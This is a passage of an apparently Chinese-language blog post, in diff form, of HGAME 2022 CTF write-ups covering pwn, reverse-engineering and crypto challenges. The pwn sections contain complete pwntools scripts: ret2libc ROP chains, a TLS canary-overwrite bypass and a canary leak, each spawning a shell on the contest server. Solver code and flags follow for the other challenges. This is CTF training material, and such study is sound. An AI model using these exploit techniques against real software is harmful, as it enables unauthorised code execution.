+binsh_addr <span style="color:#f92672">=</span> libc_addr <span style="color:#f92672">+</span> binsh_offset
+system_addr <span style="color:#f92672">=</span> libc_addr <span style="color:#f92672">+</span> system_offset
+
+payload <span style="color:#f92672">=</span> pre_payload <span style="color:#f92672">+</span> p64(ret) <span style="color:#f92672">+</span> p64(pop_rdi_ret) <span style="color:#f92672">+</span> p64(binsh_addr) <span style="color:#f92672">+</span> p64(system_addr)
+p<span style="color:#f92672">.</span>sendline(payload)
+p<span style="color:#f92672">.</span>recvline()
+
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><h3 id="pwnenter_the_evil_pwn_land">[Pwn]enter_the_evil_pwn_land</h3>
+<p>这道题目的难点在于 Canary 的绕过，用到了一个 ptrace 的特性，Canary 存储在 TLS 中，ptrace 时 TLS 距离栈较近，所以只需要疯狂往后覆盖就行，我这里覆盖了 0x900 位</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
+
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chuj.top&#34;</span>, <span style="color:#ae81ff">35131</span>)
+<span style="color:#75715e"># p = process(&#39;./a.out&#39;)</span>
+
+pop_rdi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401363</span>
+pop_rsi_r15_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401361</span>
+puts_got <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404020</span>
+puts_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4010A0</span>
+test_thread <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4011D6</span>
+main <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4012A3</span>
+ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40101a</span>
+<span style="color:#75715e"># gdb.attach(p, &#39;thread 2\nb *0x401245&#39;)</span>
+pre_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x28</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;c&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
+payload <span style="color:#f92672">=</span> p64(pop_rdi_ret) <span style="color:#f92672">+</span> p64(puts_got) <span style="color:#f92672">+</span> p64(puts_plt) <span style="color:#f92672">+</span> p64(test_thread)
+
+p<span style="color:#f92672">.</span>sendline(pre_payload <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;c&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x900</span>)
+print (p<span style="color:#f92672">.</span>recvline())
+puts_addr <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x00</span><span style="color:#e6db74">&#39;</span>)
+
+puts_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x875A0</span>
+binsh_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1B75AA</span>
+execv_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xE6450</span>
+
+libc_addr <span style="color:#f92672">=</span> puts_addr <span style="color:#f92672">-</span> puts_offset
+binsh_addr <span style="color:#f92672">=</span> libc_addr <span style="color:#f92672">+</span> binsh_offset
+execv_addr <span style="color:#f92672">=</span> libc_addr <span style="color:#f92672">+</span> execv_offset
+
+payload <span style="color:#f92672">=</span> p64(ret) <span style="color:#f92672">+</span> p64(pop_rdi_ret) <span style="color:#f92672">+</span> p64(binsh_addr) <span style="color:#f92672">+</span> p64(pop_rsi_r15_ret) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(execv_addr)
+p<span style="color:#f92672">.</span>sendline(pre_payload <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;c&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x900</span>)
+
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><blockquote>
+<p>此外，这题还学到了 gdb 调试 threads 的技巧
+<code>info threads</code> 可以查看当前的线程，<code>thread i</code> 可以切换到第 i 个线程</p>
+</blockquote>
+<h3 id="pwntest_your_gdb">[Pwn]test_your_gdb</h3>
+<p>先调试拿到 password，然后就是简单的 ret2text 了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
+
+<span style="color:#75715e"># p = process(b&#39;./a.out&#39;)</span>
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chuj.top&#34;</span>, <span style="color:#ae81ff">50748</span>)
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x47\xf1\x94\x82\x0e\x1e\x36\xb0\xa9\xa6\xd8\x4e\xc3\xe0\x09\x8c</span><span style="color:#e6db74">&#39;</span>
+<span style="color:#75715e"># gdb.attach(p)</span>
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;pass word</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+p<span style="color:#f92672">.</span>send(payload)
+p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">0x18</span>)
+canary <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">8</span>)
+p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">0x100</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20</span>)
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x18</span> <span style="color:#f92672">+</span> canary <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x401256</span>)
+p<span style="color:#f92672">.</span>sendline(payload)
+
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><h2 id="week2">Week2</h2>
+<h3 id="rexd-maze">[Re]xD MAZE</h3>
+<p>一维的迷宫，直接用 vscode 的小技巧转成 flag</p>
+<p>选中 512 个 <code>#</code> 和后面的一个空格，然后 <code>CTRL+SHIFT+L</code> 全选，换成 <code>3</code>，以此类推</p>
+<h3 id="reupx-magic-0">[Re]upx magic 0</h3>
+<p>把所有可见字符都算一遍，然后映射回去就行</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">crc</span>(x):
+    x <span style="color:#f92672">&lt;&lt;=</span> <span style="color:#ae81ff">8</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
+        <span style="color:#66d9ef">if</span> x <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x8000</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
+            x <span style="color:#f92672">=</span> (x <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x1021</span>
+        <span style="color:#66d9ef">else</span>:
+            x <span style="color:#f92672">*=</span> <span style="color:#ae81ff">2</span>
+        x <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0xffff</span>
+    <span style="color:#66d9ef">return</span> x
+
+a <span style="color:#f92672">=</span> []
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0x80</span>):
+    a<span style="color:#f92672">.</span>append(crc(i))
+
+cipher <span style="color:#f92672">=</span> [
+  <span style="color:#ae81ff">0x8D68</span>, <span style="color:#ae81ff">0x9D49</span>, <span style="color:#ae81ff">0x2A12</span>, <span style="color:#ae81ff">0xAB1A</span>, <span style="color:#ae81ff">0xCBDC</span>, <span style="color:#ae81ff">0xB92B</span>, <span style="color:#ae81ff">0x2E32</span>, <span style="color:#ae81ff">0x9F59</span>, 
+  <span style="color:#ae81ff">0xDDCD</span>, <span style="color:#ae81ff">0x9D49</span>, <span style="color:#ae81ff">0xA90A</span>, <span style="color:#ae81ff">0xE70</span>, <span style="color:#ae81ff">0xF5CF</span>, <span style="color:#ae81ff">0xA50</span>, <span style="color:#ae81ff">0x5AF5</span>, <span style="color:#ae81ff">0xFF9F</span>, 
+  <span style="color:#ae81ff">0x9F59</span>, <span style="color:#ae81ff">0xBD0B</span>, <span style="color:#ae81ff">0x58E5</span>, <span style="color:#ae81ff">0x3823</span>, <span style="color:#ae81ff">0xBF1B</span>, <span style="color:#ae81ff">0x78A7</span>, <span style="color:#ae81ff">0xAB1A</span>, <span style="color:#ae81ff">0x48C4</span>,
+  <span style="color:#ae81ff">0xA90A</span>, <span style="color:#ae81ff">0x2C22</span>, <span style="color:#ae81ff">0x9F59</span>, <span style="color:#ae81ff">0x5CC5</span>, <span style="color:#ae81ff">0x5ED5</span>, <span style="color:#ae81ff">0x78A7</span>, <span style="color:#ae81ff">0x2672</span>, <span style="color:#ae81ff">0x5695</span>
+]
+
+<span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> cipher:
+    print (chr(a<span style="color:#f92672">.</span>index(c)), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+<span style="color:#75715e"># noW_YOu~koNw-UPx~mAG|C_@Nd~crC16</span>
+</code></pre></div><h3 id="reupx-magic-1">[Re]upx magic 1</h3>
+<p>发现没法自动脱壳，010 打开之后，手动把三个 <code>UPX?</code> 改成 <code>UPX!</code>，之后就能自动脱壳了</p>
+<h3 id="refake-shell">[Re]fake shell</h3>
+<p>RC4 + init 更换密钥</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">target <span style="color:#f92672">=</span> [
+    <span style="color:#ae81ff">0xB6</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0xFA</span>, <span style="color:#ae81ff">0x8F</span>, <span style="color:#ae81ff">0x3D</span>, <span style="color:#ae81ff">0x5F</span>, <span style="color:#ae81ff">0xB2</span>, <span style="color:#ae81ff">0xE0</span>,
+    <span style="color:#ae81ff">0xEA</span>, <span style="color:#ae81ff">0x0F</span>, <span style="color:#ae81ff">0xD2</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x98</span>, <span style="color:#ae81ff">0x6C</span>, <span style="color:#ae81ff">0x9D</span>, <span style="color:#ae81ff">0xE7</span>,
+    <span style="color:#ae81ff">0x1B</span>, <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x71</span>, <span style="color:#ae81ff">0xC5</span>, <span style="color:#ae81ff">0xBE</span>, <span style="color:#ae81ff">0x6F</span>, <span style="color:#ae81ff">0x6D</span>,
+    <span style="color:#ae81ff">0x7C</span>, <span style="color:#ae81ff">0x7B</span>, <span style="color:#ae81ff">0x09</span>, <span style="color:#ae81ff">0x8D</span>, <span style="color:#ae81ff">0xA8</span>, <span style="color:#ae81ff">0xBD</span>, <span style="color:#ae81ff">0xF3</span>, <span style="color:#ae81ff">0xF6</span>
+]
+
+<span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> ARC4
+
+rc4 <span style="color:#f92672">=</span> ARC4<span style="color:#f92672">.</span>new(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;w0wy0ugot1t&#39;</span>)
+
+rc4<span style="color:#f92672">.</span>decrypt(bytes(target))
+
+<span style="color:#75715e"># b&#39;hgame{s0meth1ng_run_bef0r_m4in?}&#39;</span>
+</code></pre></div><p>或者直接动调也行</p>
+<h3 id="recreakme2">[Re]creakme2</h3>
+<p>在加密函数里看一下汇编，发现用了 try except 来构造了一个除 0 异常，当最高位为 0 时，异或一个 0x1234567</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">encipher</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> num_rounds, <span style="color:#66d9ef">uint32_t</span> v[<span style="color:#ae81ff">2</span>], <span style="color:#66d9ef">uint32_t</span> <span style="color:#66d9ef">const</span> key[<span style="color:#ae81ff">4</span>]) {
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i;
+    <span style="color:#66d9ef">uint32_t</span> v0<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">0</span>], v1<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">1</span>], sum<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, delta<span style="color:#f92672">=</span><span style="color:#ae81ff">0x9E3779B1</span>;
+    <span style="color:#66d9ef">for</span> (i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> num_rounds; i<span style="color:#f92672">++</span>) {
+        v0 <span style="color:#f92672">+=</span> (((v1 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">^</span> (v1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>)) <span style="color:#f92672">+</span> v1) <span style="color:#f92672">^</span> (sum <span style="color:#f92672">+</span> key[sum <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">3</span>]);
+        sum <span style="color:#f92672">+=</span> delta;
+        <span style="color:#66d9ef">if</span> (sum <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">31</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
+            sum <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0x1234567</span>;
+        printf(<span style="color:#e6db74">&#34;%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, sum);
+        v1 <span style="color:#f92672">+=</span> (((v0 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">^</span> (v0 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>)) <span style="color:#f92672">+</span> v0) <span style="color:#f92672">^</span> (sum <span style="color:#f92672">+</span> key[(sum<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">11</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">3</span>]);
+    }
+    v[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span>v0; v[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span>v1;
+    printf(<span style="color:#e6db74">&#34;%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, sum);
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">decipher</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> num_rounds, <span style="color:#66d9ef">uint32_t</span> v[<span style="color:#ae81ff">2</span>], <span style="color:#66d9ef">uint32_t</span> <span style="color:#66d9ef">const</span> key[<span style="color:#ae81ff">4</span>]) {
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i;
+    <span style="color:#66d9ef">uint32_t</span> v0<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">0</span>], v1<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">1</span>], delta<span style="color:#f92672">=</span><span style="color:#ae81ff">0x9E3779B1</span>, sum<span style="color:#f92672">=</span><span style="color:#ae81ff">0xc78e4d05</span>;
+    <span style="color:#66d9ef">for</span> (i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> num_rounds; i<span style="color:#f92672">++</span>) {
+        v1 <span style="color:#f92672">-=</span> (((v0 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">^</span> (v0 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>)) <span style="color:#f92672">+</span> v0) <span style="color:#f92672">^</span> (sum <span style="color:#f92672">+</span> key[(sum<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">11</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">3</span>]);
+        <span style="color:#66d9ef">if</span> (sum <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">31</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
+            sum <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0x1234567</span>;
+        sum <span style="color:#f92672">-=</span> delta;
+        printf(<span style="color:#e6db74">&#34;%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, sum);
+        v0 <span style="color:#f92672">-=</span> (((v1 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">^</span> (v1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>)) <span style="color:#f92672">+</span> v1) <span style="color:#f92672">^</span> (sum <span style="color:#f92672">+</span> key[sum <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">3</span>]);
+    }
+    v[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span>v0; v[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span>v1;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+{
+    <span style="color:#66d9ef">uint32_t</span> v[]<span style="color:#f92672">=</span>{<span style="color:#ae81ff">0x457E62CF</span>, <span style="color:#ae81ff">0x9537896C</span>, <span style="color:#ae81ff">0x1F7E7F72</span>, <span style="color:#ae81ff">0xF7A073D8</span>, <span style="color:#ae81ff">0x8E996868</span>, <span style="color:#ae81ff">0x40AFAF99</span>, <span style="color:#ae81ff">0xF990E34</span>, <span style="color:#ae81ff">0x196F4086</span>};
+    <span style="color:#66d9ef">uint32_t</span> <span style="color:#66d9ef">const</span> k[<span style="color:#ae81ff">4</span>]<span style="color:#f92672">=</span>{<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>};
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> r<span style="color:#f92672">=</span><span style="color:#ae81ff">32</span>;
+    decipher(r, v, k);
+    decipher(r, v <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>, k);
+    decipher(r, v <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>, k);
+    decipher(r, v <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span>, k);
+    printf(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,v);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><h3 id="cryptothe-password-plus-pro-max-ultra">[Crypto]The Password Plus Pro Max Ultra</h3>
+<p>进行了一下数学推导</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 85; 
+			flex-basis: 206px"
+	>
+	<a href="/post/hgame2022-writeups/thepasswordppmu.png" data-size="1667x1940">
+		<img src="/post/hgame2022-writeups/thepasswordppmu.png"
+			width="1667"
+			height="1940"
+			srcset="/post/hgame2022-writeups/thepasswordppmu_hu1e60315d6ac126f95d826105b72244f0_551164_480x0_resize_box_3.png 480w, /post/hgame2022-writeups/thepasswordppmu_hu1e60315d6ac126f95d826105b72244f0_551164_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>结论就是做 64 次加密就回来了</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 284; 
+			flex-basis: 681px"
+	>
+	<a href="/post/hgame2022-writeups/thepasswordppmu_poc.jpg" data-size="628x221">
+		<img src="/post/hgame2022-writeups/thepasswordppmu_poc.jpg"
+			width="628"
+			height="221"
+			srcset="/post/hgame2022-writeups/thepasswordppmu_poc_hu7cecdefa604a15e3cd54782414f5dfcd_20981_480x0_resize_q75_box.jpg 480w, /post/hgame2022-writeups/thepasswordppmu_poc_hu7cecdefa604a15e3cd54782414f5dfcd_20981_1024x0_resize_q75_box.jpg 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>最后求解</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> functools <span style="color:#f92672">import</span> reduce
+<span style="color:#f92672">from</span> operator <span style="color:#f92672">import</span> xor
+<span style="color:#f92672">from</span> random <span style="color:#f92672">import</span> sample
+<span style="color:#f92672">from</span> re <span style="color:#f92672">import</span> findall
+<span style="color:#f92672">from</span> libnum <span style="color:#f92672">import</span> s2n
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">move</span>(n, k):
+    s <span style="color:#f92672">=</span> bin(n)[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">64</span>)
+    k <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">63</span>
+    <span style="color:#66d9ef">return</span> int(s[k:] <span style="color:#f92672">+</span> s[:k], <span style="color:#ae81ff">2</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(x, ks):
+    <span style="color:#66d9ef">return</span> xor(x, reduce(xor, map(<span style="color:#66d9ef">lambda</span> k: move(x, k), ks)))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(x, ks):
+    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">63</span>):
+            x <span style="color:#f92672">=</span> encrypt(x, ks)
+    <span style="color:#66d9ef">return</span> x
+
+ks <span style="color:#f92672">=</span> [[<span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">35</span>], [<span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">45</span>],  [<span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">44</span>, <span style="color:#ae81ff">55</span>],  [<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">63</span>], [<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">43</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">53</span>, <span style="color:#ae81ff">59</span>], [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">31</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">43</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">62</span>], [<span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">34</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">55</span>, <span style="color:#ae81ff">58</span>], [<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">47</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">61</span>],  [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">36</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">55</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">62</span>],  [<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">31</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">44</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">53</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">61</span>, <span style="color:#ae81ff">62</span>], [<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">34</span>, <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">60</span>], [<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">34</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">43</span>, <span style="color:#ae81ff">44</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">53</span>], [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">27</span>, <span 